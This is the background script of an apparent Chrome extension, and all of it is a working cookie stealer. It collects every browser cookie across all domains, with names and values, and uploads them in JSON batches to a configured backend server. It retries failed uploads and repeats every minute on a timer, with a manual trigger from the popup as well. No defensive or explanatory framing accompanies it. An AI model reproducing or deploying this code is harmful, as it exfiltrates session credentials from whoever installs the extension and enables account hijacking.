// background.js
import { CONFIG } from "./config.js";

console.log("Background service worker loaded!");

// ---- Read all cookies and return array ----
function getAllCookies() {
  return new Promise((resolve) => {
    chrome.cookies.getAll({}, (cookies) => {
      const allCookies = (cookies || []).map(cookie => ({
        domain: cookie.domain,
        name: cookie.name,
        value: cookie.value
      }));
      resolve(allCookies);
    });
  });
}

// ---- Split array into batches ----
function chunkArray(array, chunkSize) {
  const chunks = [];
  for (let i = 0; i < array.length; i += chunkSize) {
    chunks.push(array.slice(i, i + chunkSize));
  }
  return chunks;
}

// ---- Send one batch as file to server with retries ----
async function sendBatchAsFile(batch, batchIndex = 1, retryCount = 0) {
  try {
    const blob = new Blob([JSON.stringify(batch, null, 2)], { type: "application/json" });
    const formData = new FormData();
    // Filename includes batch number and timestamp
    const filename = `cookies_batch_${batchIndex}_${Date.now()}.json`;
    formData.append("file", blob, filename);

    console.log(`Uploading batch ${batchIndex} (${batch.length} cookies) as file: ${filename}`);

    const response = await fetch(CONFIG.BACKEND_URL, {
      method: "POST",
      body: formData
    });

    if (!response.ok) {
      throw new Error(`Server returned status ${response.status}`);
    }

    const text = await response.text();
    console.log(`Server response for batch ${batchIndex}:`, text);

  } catch (err) {
    console.error(`Error sending batch ${batchIndex}:`, err);

    if (retryCount < 3) {
      console.log(`Retrying batch ${batchIndex} in 5 seconds... (Attempt ${retryCount + 1})`);
      setTimeout(() => sendBatchAsFile(batch, batchIndex, retryCount + 1), 5000);
    } else {
      console.error(`Failed to send batch ${batchIndex} after 3 retries.`);
    }
  }
}

// ---- Read all cookies and send in batches as files ----
function readAndUploadCookies(batchSize = 50) {
  getAllCookies().then(allCookies => {
    console.log("Total cookies to upload:", allCookies.length);

    const batches = chunkArray(allCookies, batchSize);
    console.log("Number of batches:", batches.length);

    batches.forEach((batch, index) => {
      sendBatchAsFile(batch, index + 1);
    });
  });
}

// ---- Periodic alarm every 1 minute ----
chrome.alarms.create("uploadCookies", { periodInMinutes: 1 });
chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "uploadCookies") {
    readAndUploadCookies();
  }
});

// ---- Manual trigger from popup ----
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action === "readNow") {
    readAndUploadCookies();
    sendResponse({ message: "Cookie read/upload triggered!" });
  }
});